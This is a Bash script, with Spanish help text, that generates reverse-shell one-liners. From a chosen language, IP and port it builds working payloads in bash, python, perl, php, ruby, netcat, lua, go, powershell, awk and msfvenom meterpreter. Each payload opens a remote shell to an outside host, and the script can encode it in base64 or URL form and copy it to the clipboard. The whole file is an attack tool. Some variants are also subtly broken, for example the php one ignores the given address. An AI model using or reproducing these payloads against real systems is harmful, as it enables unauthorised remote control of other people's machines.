#!/bin/bash

#Colours
greenColour="\e[0;32m\033[1m"
endColour="\033[0m\e[0m"
redColour="\e[0;31m\033[1m"
blueColour="\e[0;34m\033[1m"
yellowColour="\e[0;33m\033[1m"
purpleColour="\e[0;35m\033[1m"
turquoiseColour="\e[0;36m\033[1m"
grayColour="\e[0;37m\033[1m"


# Functions
function banner(){
	echo -e "${grayColour}
┏━━━┓             ┏━━━━━┓
┃┏━┓┃             ┃ ┏━┓ ┃
┃┗━━┳━┳━┳━┳━┳━━┳━━┫ ┗━┛ ┣━━┳━┳━┓
┗━━┓┃ ┃ ┃ ┣━┫ ━┫ ━┫ ┏┓ ┏┫ ━┫ ┃ ┃
┃┗━┛┃ ┻ ┻ ┃ ┣━ ┣━ ┃ ┃┃ ┗┫ ━╋┓ ┏┛
┗━━━┻━━━━━┻━┻━━┻━━┻━┛┗━━┻━━┛┗━┛${endColour}		${redColour}[*]${endColour} ${purpleColour}Hecho por:${endColour} ${grayColour}xdann1${endColour}"
}

function helpPanel(){
	banner
	echo -e "\n${redColour}[!]${endColour} ${purpleColour}USO:${endColour}${yellowColour} $0 <lenguaje> <ip> <puerto>${endColour}"
	echo -e "\n${greenColour}[-h]${endColour} ${purpleColour}PANEL DE AYUDA:${endColour} ${yellowColour}Abre el panel de ayuda.${endColour}"
	echo -e "\n${greenColour}[-l] ${endColour}${purpleColour}LENGUAJE:${endColour} ${yellowColour}Especifica en que lenguaje quieres la Reverse Shell. (obligatorio)${endColour}"
	echo -e "\t${turquoiseColour}-l\t\t<lenguaje>"
	echo -e "\tEj:\t\t-l bash"
	echo -e "\n\tbash:\t\tReverse Shell en bash"
	echo -e "\tpython:\t\tReverse Shell en python"
	echo -e "\tperl:\t\tReverse Shell en perl"
	echo -e "\tphp:\t\tReverse Shell en php"
	echo -e "\truby:\t\tReverse Shell en ruby"
	echo -e "\tnc:\t\tReverse Shell en netcat (forma corta)"
	echo -e "\tnetcat:\t\tReverse Shell en netcat (forma larga)"
	echo -e "\tlua:\t\tReverse Shell en lua"
	echo -e "\tgo:\t\tReverse Shell en go"
	echo -e "\tpowershell:\tReverse Shell en powershell"
	echo -e "\tawk:\t\tReverse Shell en awk"
	echo -e "\tmeterpreterW:\tReverse Shell en meterpreter windows"
	echo -e "\tmeterpreterL:\tReverse Shell en meterpreter linux${endColour}"
	echo -e "\n${greenColour}[-i] ${endColour}${purpleColour}IP:${endColour} ${yellowColour}Especifica tu IP. (obligatorio)${endColour}"
	echo -e "\t${turquoiseColour}-i\t\t<ip>"
	echo -e "\tEj:\t\t-i 127.0.0.1${endColour}"
	echo -e "\n${greenColour}[-p] ${endColour}${purpleColour}PUERTO:${endColour} ${yellowColour}Especifica un puerto. (obligatorio)${endColour}"
	echo -e "\t${turquoiseColour}-p\t\t<puerto>"
	echo -e "\tEj:\t\t-p 443${endColour}"
	echo -e "\n${greenColour}[-c] ${endColour}${purpleColour}CODIFICACIÓN:${endColour} ${yellowColour}Especifica que la Reverse Shell se codifique. (NO obligatorio)${endColour}"
	echo -e "\t${turquoiseColour}-c\t\t<codificación>"
	echo -e "\tEj:\t\t-c b64"
	echo -e "\n\tb64:\t\tReverse Shell codificada en base64"
	echo -e "\turl:\t\tReverse Shell codificada en url"
	echo -e "\turl2:\t\tReverse Shell codificada en url (sin barras laterales)${endColour}"
	exit 0
}

function mainScript(){
	if [ $language == "bash" ]; then
		shell="bash -i >& /dev/tcp/$ip/$port 0>&1"
		banner; echo -e "\n${redColour}[*] ${endColour}${grayColour}Reverse Shell ${endColour}${redColour}-> ${endColour}${yellowColour}$shell${endColour}"; echo -e "$shell" | xclip -sel clip

	elif [ $language == "python" ]; then
		shell="python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("$ip",$port));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'"
		banner; echo -e "\n${redColour}[*] ${endColour}${grayColour}Reverse Shell ${endColour}${redColour}-> ${endColour}${yellowColour}$shell${endColour}"; echo -e "$shell" | xclip -sel clip

	elif [ $language == "perl" ]; then
		shell="perl -e 'use Socket;$i="$ip";$p=$port;socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");};'"
		banner; echo -e "\n${redColour}[*] ${endColour}${grayColour}Reverse Shell ${endColour}${redColour}-> ${endColour}${yellowColour}$shell${endColour}"; echo -e "$shell" | xclip -sel clip

	elif [ $language == "php" ]; then
		shell="php -r '$sock=fsockopen(\"10.0.0.1\",1234);exec(\"/bin/sh -i <&3 >&3 2>&3\");'"
		banner; echo -e "\n${redColour}[*] ${endColour}${grayColour}Reverse Shell ${endColour}${redColour}-> ${endColour}${yellowColour}$shell${endColour}"; echo -e "$shell" | xclip -sel clip

	elif [ $language == "ruby" ]; then
		shell="ruby -rsocket -e'f=TCPSocket.open(\"$ip\",$port).to_i;exec sprintf(\"/bin/sh \-i <&%d >&%d 2>&%d\",f,f,f)'"
		banner; echo -e "\n${redColour}[*] ${endColour}${grayColour}Reverse Shell ${endColour}${redColour}-> ${endColour}${yellowColour}$shell${endColour}"; echo -e "$shell" | xclip -sel clip

	elif [ $language == "nc" ]; then
		shell="nc -e /bin/sh $ip $port"
		banner; echo -e "\n${redColour}[*] ${endColour}${grayColour}Reverse Shell ${endColour}${redColour}-> ${endColour}${yellowColour}$shell${endColour}"; echo -e "$shell" | xclip -sel clip

	elif [ $language == "netcat" ]; then
		shell="rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc $ip $port >/tmp/f"
		banner; echo -e "\n${redColour}[*] ${endColour}${grayColour}Reverse Shell ${endColour}${redColour}-> ${endColour}${yellowColour}$shell${endColour}"; echo -e "$shell" | xclip -sel clip

	elif [ $language == "lua" ]; then
		shell="lua5.1 -e 'local host, port = $ip, $port local socket = require(socket) local tcp = socket.tcp() local io = require(io) tcp:connect(host, port); while true do local cmd, status, partial = tcp:receive() local f = io.popen(cmd, r) local s = f:read(*a) f:close() tcp:send(s) if status == closed then break end end tcp:close()'"
		banner; echo -e "\n${redColour}[*] ${endColour}${grayColour}Reverse Shell ${endColour}${redColour}-> ${endColour}${yellowColour}$shell${endColour}"; echo -e "$shell" | xclip -sel clip

	elif [ $language == "go" ]; then
		shell="echo 'package main;import"os/exec";import"net";func main(){c,_:=net.Dial("tcp","$ip:$port");cmd:=exec.Command("/bin/sh");cmd.Stdin=c;cmd.Stdout=c;cmd.Stderr=c;cmd.Run()}' > /tmp/t.go && go run /tmp/t.go && rm /tmp/t.go"
		banner; echo -e "\n${redColour}[*] ${endColour}${grayColour}Reverse Shell ${endColour}${redColour}-> ${endColour}${yellowColour}$shell${endColour}"; echo -e "$shell" | xclip -sel clip

	elif [ $language == "powershell" ]; then
		shell="powershell -nop -c \"$client = New-Object System.Net.Sockets.TCPClient('$ip',$port);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()\""
		banner; echo -e "\n${redColour}[*] ${endColour}${grayColour}Reverse Shell ${endColour}${redColour}-> ${endColour}${yellowColour}$shell${endColour}"; echo -e "$shell" | xclip -sel clip

	elif [ $language == "awk" ]; then
		shell="awk 'BEGIN {s = \"/inet/tcp/0/$ip/$port\"; while(42) { do{ printf \"shell>\" |& s; s |& getline c; if(c){ while ((c |& getline) > 0) print $0 |& s; close(c); } } while(c != "exit") close(s); }}' /dev/null"
		banner; echo -e "\n${redColour}[*] ${endColour}${grayColour}Reverse Shell ${endColour}${redColour}-> ${endColour}${yellowColour}$shell${endColour}"; echo -e "$shell" | xclip -sel clip

	elif [ $language == "meterpreterW" ]; then
		shell="msfvenom -p windows/meterpreter/reverse_tcp LHOST=$ip LPORT=$port -f exe > reverse.exe"
		banner; echo -e "\n${redColour}[*] ${endColour}${grayColour}Reverse Shell ${endColour}${redColour}-> ${endColour}${yellowColour}$shell${endColour}"; echo -e "$shell" | xclip -sel clip

	elif [ $language == "meterpreterL" ]; then
		shell="msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=$ip LPORT=$port -f elf >reverse.elf"
		banner; echo -e "\n${redColour}[*] ${endColour}${grayColour}Reverse Shell ${endColour}${redColour}-> ${endColour}${yellowColour}$shell${endColour}"; echo -e "$shell" | xclip -sel clip

	else
		helpPanel
	fi
}

function encoding(){
	if [ $code == "b64" ]; then
		mainScript
		encode=$(echo $shell | base64)
		echo -e "${redColour}[*] ${endColour}${grayColour}Reverse Shell (base64) ${endColour}${redColour}-> ${endColour}${yellowColour}$encode${endColour}"; echo -e "$encode" | xclip -sel clip
	elif [ $code == "url" ]; then
		which urlencode > /dev/null 2>&1
		if [ $(echo $?) == 0 ]; then
			mainScript
			encode=$(urlencode -m "$shell")
			echo -e "${redColour}[*] ${endColour}${grayColour}Reverse Shell (url) ${endColour}${redColour}-> ${endColour}${yellowColour}$encode${endColour}"; echo -e "$encode" | xclip -sel clip
		else
			banner
			echo -e "\n${redColour}[!]${endColour} ${grayColour}Falta la herramienta urlencode${endColour}"
			echo -e "    ${grayColour}Instalando la herramienta...${endColour}"
			sudo apt install gridsite-clients -y > /dev/null 2>&1
			which urlencode > /dev/null 2>&1
			if [ $(echo $?) == 0 ]; then
				echo -e "\n${redColour}[*]${endColour} ${grayColour}Ya se ha instalado la herramienta, vuelve a ejecutar el programa${grayColour}"
			else
				echo -e "\n${redColour}[!]${endColour} ${grayColour}La instalación ha fallado, intenta instalarlo manualmente con el comando:${grayColour}"
				echo -e "${yellowColour}    sudo apt install gridsite-clients${endColour}"
			fi
		fi
	elif [ $code == "url2" ]; then
		which urlencode > /dev/null 2>&1
		if [ $(echo $?) == 0 ]; then
			mainScript
			encode=$(urlencode "$shell")
			echo -e "${redColour}[*] ${endColour}${grayColour}Reverse Shell (url) ${endColour}${redColour}-> ${endColour}${yellowColour}$encode${endColour}"; echo -e "$encode" | xclip -sel clip
		else
			banner
			echo -e "\n${redColour}[!]${endColour} ${grayColour}Falta la herramienta urlencode${endColour}"
			echo -e "    ${grayColour}Instalando la herramienta...${endColour}"
			sudo apt install gridsite-clients -y > /dev/null 2>&1
			which urlencode > /dev/null 2>&1
			if [ $(echo $?) == 0 ]; then
				echo -e "\n${redColour}[*]${endColour} ${grayColour}Ya se ha instalado la herramienta, vuelve a ejecutar el programa${grayColour}"
			else
				echo -e "\n${redColour}[!]${endColour} ${grayColour}La instalación ha fallado, intenta instalarlo manualmente con el comando:${grayColour}"
				echo -e "${yellowColour}    sudo apt install gridsite-clients${endColour}"
			fi
		fi

	else
		helpPanel
	fi
}


# Main Script
declare -i counter=0; while getopts ":l:i:p:h:c:" arg; do
	case $arg in
		l) language=$OPTARG; let counter+=1 ;;
		i) ip=$OPTARG; let counter+=1 ;;
		p) port=$OPTARG; let counter+=1 ;;
		c) code=$OPTARG ;;
		h) helpPanel ;;
	esac
done

if [[ $counter -eq 3 ]]; then
	which xclip > /dev/null 2>&1
	if [ $(echo $?) == 0 ]; then
		if [ $code ]; then
			encoding
		else
			mainScript
		fi
	else
		banner
		echo -e "\n${redColour}[!]${endColour} ${grayColour}Falta la herramienta xclip${endColour}"
		echo -e "    ${grayColour}Instalando la herramienta...${endColour}"
		sudo apt install xclip -y > /dev/null 2>&1
		which xclip > /dev/null 2>&1
		if [ $(echo $?) == 0 ]; then
			echo -e "\n${redColour}[*]${endColour} ${grayColour}Ya se ha instalado la herramienta, vuelve a ejecutar el programa${grayColour}"
		else
			echo -e "\n${redColour}[!]${endColour} ${grayColour}La instalación ha fallado, intenta instalarlo manualmente con el comando:${grayColour}"
			echo -e "${yellowColour}    sudo apt install xclip${endColour}"
		fi
	fi
else
	helpPanel
fi
